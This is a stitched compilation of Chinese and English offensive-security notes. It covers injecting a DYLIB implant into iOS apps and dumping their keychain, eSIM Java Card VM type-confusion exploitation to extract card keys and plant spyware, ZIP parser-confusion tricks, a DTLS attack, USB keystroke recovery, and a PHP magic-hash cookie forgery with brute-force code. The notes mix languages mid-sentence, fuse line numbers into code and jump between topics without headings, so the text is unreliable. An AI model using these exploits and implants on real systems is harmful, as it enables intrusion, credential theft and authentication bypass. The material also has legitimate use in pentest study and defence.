DYLIB injection + free Apple ID re-sign (CLI) USB-only access to the injected implant Enable Developer Mode (iOS 16+) Modern sideloading options Hooking / dynamic instrumentation Frida Gadget injection in non-jailbroken IPAs (listen mode) Automated dynamic analysis with MobSF (no jailbreak) iOS 17 & Lockdown Mode caveats # 核心要点 After clicking Add, Configurator will 下载 the IPA from Apple, and attempt to push it to your device. If you followed my recommendation earlier and installed the IPA already, a prompt asking you to reinstall the app will appear. The IPA should be downloaded inside /Users/[username]/Library/Group\ Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems/MobileAppsfrom where you can grab it If you already have a decrypted IPA, you can patch it to load a custom DYLIB, add entitlements (e.g., network), and re-sign it without Xcode using a free Apple ID. This is useful for in-app instrumentation on non-jailbroken devices. This does not 绕过 the sandbox. The injected code runs inside the app process and can only access the app’s sandbox and keychain access groups. Since iOS 16 Apple introduced Developer Mode: any binary that carries get task allow or is signed with a development certificate will refuse to launch until Developer Mode is enabled on the device. You will also not be able to attach Frida/LLDB unless this flag is on. Recent Frida releases (>=16) automatically handle pointer 认证 and other iOS 17 mitigations, so most existing scripts work out-of-the-box. # 命令 / 载荷 / 操作片段 # 1. Decrypting the app 1unzip redacted.ipa -d unzipped # 2. Decrypting the app 12cd unzippedzip -r ../no-min-version.ipa * # 3. Decrypting the app 1ideviceinstaller -i no-min-version.ipa -w # 4. Patch entitlements & re-sign 1ideviceinstaller -i resigned.ipa -w # 5. IPA patching + DYLIB injection + free Apple ID re-sign (CLI) 1234567891011121314# Build the implant (macOS for build step)make# Patch the IPA to inject the DYLIBpython3 tools/patcher.py patch --ipa MyApp.ipa --dylib libShell.dylib# -> MyApp_patched.ipa# Patch + sign + install in one step (free Apple ID)python3 tools/patcher.py full \ --ipa MyApp.ipa \ --dylib libShell.dylib \ --apple-id user@example.com \ --install \ --udid <device-udid> # 6. USB-only access to the injected implant 1234567# Forward device-local TCP port to hostiproxy 8080 8080# Example client commands (host side)python3 client.py "ls"python3 client.py "pwd"python3 client.py "scp -r Documents host:./downloads" # 7. USB-only access to the injected implant 123python3 client.py "keychain dump"python3 client.py "keychain dump --filter self"python3 client.py "keychain dump --class generic" # 8. Hooking / dynamic instrumentation 12345# Spawn & attach with objectionobjection -g "com.example.target" explore# Or plain Fridafrida -U -f com.example.target -l my_script.js --no-pause # 9. Frida Gadget injection in non-jailbroken IPAs (listen mode) 12python3 gadget_injector.py MyApp.ipa# Output: MyApp-frida-listen.ipa # 10. Frida Gadget injection in non-jailbroken IPAs (listen mode) 12345678910111213# (Optional) start the app pausedxcrun devicectl device process launch \ --device <UDID> \ --start-stopped <bundle-id># Forward Frida listen port over USB (default 27042)pymobiledevice3 usbmux forward 27042 27042# Objectionobjection -g <bundle-id> explore# Or Frida CLIfrida -H 127.0.0.1:27042 -n MyApp # 11. Automated dynamic analysis with MobSF (no jailbreak) 12345docker pull opensecurity/mobile-security-framework-mobsf:latestdocker run -p 8000:8000 --privileged \ -v /var/run/usbmuxd:/var/run/usbmuxd \ opensecurity/mobile-security-framework-mobsf:latest# Browse to http://127.0.0.1:8000 and upload your resigned IPA # 工具与参考入口 Apple Configurator https://dvuln.com/blog/modern-ios-pentesting-no-jailbreak-needed Apple documentation MobSF https://github.com/test1ng-guy/iOS-sandbox-explorer https://github.com/Saurabh221662/GadgetInjector # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Auto complete: Just execute frida -U <program> Swift apps frequently centralize jailbreak 检测 into a boolean helper such as systemSanityCheck () -> Bool. With LLDB already attached you can resolve the function name and force it to return false without touching the binary: Once the 检测 code is neutralized you can dynamically discover the mangled name of the function that handles sensitive data (e.g. the action behind a “Get Flag” button) instead of guessing: From the docs: Stalker is Frida’s code tracing engine. It allows threads to be followed, capturing every function, every block, even every instruction which is executed. In this case we aren't restarting the app or restoring the state after each 载荷. content: 来源路径： 02-知识点/漏洞利用与载荷/eSIM - Java Card VM 利用.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # eSIM - Java Card VM 利用 [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 eSIM - Java Card VM 利用 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 eSIM - Java Card VM 利用 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：eSIM / Java Card VM 利用、Overview、Attack Surface、2024–2025 ecosystem changes、The Type-Confusion Primitive；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 eSIM / Java Card VM 利用 Overview Attack Surface 2024–2025 ecosystem changes The Type-Confusion Primitive End-to-End 利用 Workflow 持久化 & Post - 利用 Targets Cloning / Hijacking Demonstration Automated Test & 利用 Toolkit Lab Validation Without OTA Mitigations Quick Checklist for Pentesters # 核心要点 Because profiles and applets can be provisioned over-the-air (OTA) via Remote SIM Provisioning (RSP), any memory-safety flaw inside the JC VM instantly becomes a remote code-execution primitive inside the most privileged component of the handset. After installation, the applet executes inside the VM. Missing run-time checks allow memory corruption. GSMA operator guidance – 2025 guidance explicitly treats malicious Java Card installation through profile misuse as an ecosystem-level risk, but that does not remove the underlying VM bug from already deployed cards. Use putfield to overwrite any 16-bit value inside an adjacent object (including VTABLE / ptr translation entries). Use getfield to read arbitrary memory once internal pointers are hijacked. The primitive provides arbitrary read / write in the eUICC address space – enough to dump the device-unique ECC private key that authenticates the card to the GSMA ecosystem. Patch Java Card applications (e.g. insert STK spyware) before re-uploading; Stealthy firmware patching / backdoor ideas – Security Explorations described a post - 利用 scenario where normal APDU handlers (for example GET DATA) are patched so the card returns sensitive material without re-running the whole 利用 chain. Profile tampering – The researchers explicitly verified that a downloaded profile can be modified offline, loaded into another eUICC and still operate for calls / SMS while carrying an injected custom Java STK app. security-test – generic verification 绕过 applet (~150 KB) 利用 – 100 % reliable Kigen eUICC compromise (~72 KB) Query GET DATA DF1F – ECu10.13 is a known vulnerable Kigen string, but do not assume other returned strings are safe without testing. Inspect loaded profiles: legacy TS.48 material and any reusable test 凭据 are the most valuable entry points; v7.x reduces exposure, but cached /preloaded older profiles still matter. # 命令 / 载荷 / 操作片段 # 1. The Type-Confusion Primitive 12345// Pseudo-bytecode sequence executed by the malicious applet// buf = newarray byte 0x100// o = (Object) buf // illegal but not verified// putfield <victimObject+offset>, 0xCAFE // arbitrary write// ... set up read-what-where gadgets ... # 2. End-to-End 利用 Workflow 180 CA DF 1F 00 // → "ECu10.13" (vulnerable) # 3. End-to-End 利用 Workflow 123// simplified APDU chain 80 E6 02 00 <data> // LOAD (block n) 80 E6 0C 00 <data> // INSTALL for load # 4. Automated Test & 利用 Toolkit 1234567scard> bsc- castcheck [arbitrary int/obj casts]- ptrgranularity [pointer granularity/tr table presence]- locvaraccess [local variable access]- stkframeaccess [stack frame access]- instfieldaccess [instance field access]- objarrconfusion [object/array size field confusion] # 5. In the wild you may see custom markers (e.g., strings like JADXBLOCK) embedded there. Examples observed: unknown IDs like 0xCAFE ("Java Executable") or 0x414A ("JA:") carrying large 载荷. Practical mitigation: rebuilding the archive (e.g., re-zipping extracted files) strips malicious Extra fields. If 工具 refuse to extract due to fake encryption, first clear GPBF bit 0 as above, then repackage: Quick 检测 (duplicate LFH offsets) Make an 上传 filter, AV pre-scan, or package validator see a benign file in the CD while the extractor honors a different LFH name/path. Abuse duplicate names, entries present only in one structure, or ambiguous Unicode path metadata (for example, Info-ZIP Unicode Path Extra Field 0x7075) so different parsers reconstruct different trees. Combine this with 路径穿越 to turn a "harmless" archive view into a write-primitive during extraction. For the extraction side, see Archive Extraction 路径穿越. # 命令 / 载荷 / 操作片段 # 1. Fake encryption (GPBF bit 0 set) without real 密码学 123456Extract Zip Spec 2D '4.5'General Purpose Flag 0A09 [Bit 0] 1 'Encryption' [Bits 1-2] 1 'Maximum Compression' [Bit 3] 1 'Streamed' [Bit 11] 1 'Language Encoding' # 5. Fake encryption (GPBF bit 0 set) without real 密码学 12345678910111213141516171819202122232425262728# gpbf_clear.py – clear encryption bit (bit 0) in ZIP local+central headersimport struct, sysSIG_LFH = b"\x50\x4b\x03\x04" # Local File HeaderSIG_CDH = b"\x50\x4b\x01\x02" # Central Directory Headerdef patch_flags(buf: bytes, sig: bytes, flag_off: int): out = bytearray(buf) i = 0 patched = 0 while True: i = out.find(sig, i) if i == -1: break flags, = struct.unpack_from('<H', out, i + flag_off) if flags & 1: # encryption bit set struct.pack_into('<H', out, i + flag_off, flags & 0xFFFE) patched += 1 i += 4 # move past signature to continue search return bytes(out), patchedif __name__ == '__main__': inp, outp = sys.argv[1], sys.argv[2] data = open(inp, 'rb').read() data, p_lfh = patch_flags(data, SIG_LFH, 6) # LFH flag at +6 data, p_cdh = patch_flags(data, SIG_CDH, 8) # CDH flag at +8 open(outp, 'wb').write(data) print(f'Patched: LFH={p_lfh}, CDH={p_cdh}') # 6. Here’s a detailed breakdown: Port Scanning: The attacker needs to guess which UDP ports are handling incoming media sessions, sending ClientHello messages with the null cipher suite to these ports to trigger the 漏洞. Diagram of Attack: The sequence involves multiple ClientHello messages sent by the attacker to the server, interleaved with legitimate signaling and DTLS messages, leading to a handshake failure due to the erroneous cipher suite. Safe Testing: Using 工具 like Scapy, attackers replay DTLS ClientHello messages targeting specific media ports. For ethical testing, modifications to Chromium (e.g., JsepTransport::AddRemoteCandidates) were used to mimic victim behavior safely. DTLS Server Configurations: Instances where the browser acts as a DTLS server or when the media server does not use ephemeral ports for media sessions are not susceptible to this 漏洞. # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

For instance, if malware uses DKOM to unlink a process from the EPROCESS linked list, it won’t show up in the Task Manager and neither will it in the pslist. As explained inside the readme you need to put the symbol table of the OS you want to support inside volatility3/volatility/symbols .\ Symbol table packs for the various operating systems are available for 下载 at: https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip https://downloads.volatilityfoundation.org/volatility3/symbols/mac.zip https://downloads.volatilityfoundation.org/volatility3/symbols/linux.zip Windows keeps track of programs you run using a feature in the registry called UserAssist keys. If the capture came from BLE keyboards tunneled over GATT, filter on btatt.value && frame.len == 20 and dump the hex 载荷 before decoding. Recent gaming keyboards, split keyboards, and composite HID devices often expose a non-boot keyboard interface where the 载荷 no longer matches modifier,reserved,key1..key6. Prefer usbhid.data over usb.capdata when Wireshark has already parsed the HID layer. ctf-usb-keyboard-parser remains handy for quick CTF challenges and already ships in the repository. # 命令 / 载荷 / 操作片段 # 1. Identify the keyboard interface first 1usb.transfer_type == 0x02 && usb.endpoint_address.direction == 1 && usb.bDescriptorType == 4 && usb.bInterfaceClass == 3 # 2. Command-line workflow 12tshark -r ./usb.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > keystrokes.txtpython3 usbkeyboard.py ./keystrokes.txt # 3. Command-line workflow 1234tshark -r usb.pcapng -Y "usb.capdata || usbhid.data" -T fields -e usb.src -e usb.capdata -e usbhid.data | \ sort -s -k1,1 | \ awk '{ printf "%s", (NR==1 ? $1 : pre!=$1 ? "\n" $1 : "") " " $2; pre=$1 }' | \ awk '{ for (i=2; i<=NF; i++) print $i > "usbdata-" $1 ".txt" }' # 4. Quick Python decoder 1234567891011121314151617181920212223242526#!/usr/bin/env python3import sysNORMAL = {0x04:'a',0x05:'b',0x06:'c',0x07:'d',0x08:'e',0x09:'f',0x0a:'g',0x1c:'y',0x1d:'z',0x28:'\n',0x2d:'-',0x2e:'=',0x2f:'[',0x30:']',0x33:';',0x34:"'",0x36:',',0x37:'.'}SHIFTED = {0x2d:'_',0x2e:'+',0x2f:'{',0x30:'}',0x33:':',0x34:'"',0x36:'<',0x37:'>'}prev = set()caps = Falsefor raw in sys.stdin: raw = raw.strip().replace(':', '') if len(raw) != 16: continue modifier = int(raw[0:2], 16) keycodes = [int(raw[i:i+2], 16) for i in range(4, 16, 2)] current = {k for k in keycodes if k} newly_pressed = [k for k in keycodes if k and k not in prev] shift = bool(modifier & 0x22) for keycode in newly_pressed: if keycode == 0x39: caps = not caps continue char = SHIFTED.get(keycode) if shift else None if char is None: char = NORMAL.get(keycode, '?') if char.isalpha() and (shift ^ caps): char = char.upper() sys.stdout.write(char) prev = current # 工具与参考入口 Wireshark USB capture setup ACSC Quals 2023：pcap 1, 2 write-up # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

If a string 哈希 starts with "0e" followed by only numbers, PHP interprets this as scientific notation and the 哈希 is treated as a float in comparison operations. The 漏洞 in the following code lies in the use of a loose comparison (!=) to validate the $cookie ['hmac'] against the calculated $ 哈希. $hmac：the provided 哈希，"0" The 利用 phase is the following: Prepare a malicious cookie: The attacker prepares a cookie with $username set to the user they wish to impersonate (for example, "admin"), $expiration set to a future UNIX timestamp, and $hmac set to "0". # 命令 / 载荷 / 操作片段 # 1. Magic Hashes 123456<?phpvar_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)var_dump(md5('aabg7XSs') == md5('aabC9RqS'));var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));?> # 2. 方法论 12345678910function validate_cookie($cookie,$key){ $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key); if($cookie['hmac'] != $hash){ // loose comparison return false; } else{ echo "Well done"; }} # 3. 方法论 1234567891011// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php for($i=1424869663; $i < 1835970773; $i++ ){ $out = hash_hmac('md5', 'admin|'.$i, ''); if(str_starts_with($out, '0e' )){ if($out == 0){ echo "$i - ".$out; break; } } } ?> # 4. 方法论 12345$cookie = [ 'username' => 'admin', 'expiration' => 1539805986, 'hmac' => '0' ]; # 工具与参考入口 LooseTypeComparison MariaDB MySQL NodeJS PHP Perl Postgres Python SQLite @spaze @spazef0rze @TihanyiNorbert @TihanyiNorbert @Chick3nman512 Root Me：PHP：Type Juggling Root Me：PHP：Loose Comparison (Super) Magic Hashes：myst404 (@myst404 )：October 7, 2019 Magic Hashes：Robert Hansen：May 11, 2015 Magic hashes – PHP 哈希 "collisions"：Michal Špaček (@spaze)：May 6, 2015 PHP Magic Tricks: Type Juggling：Chris Smith (@chrismsnz)：August 18, 2020 # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。
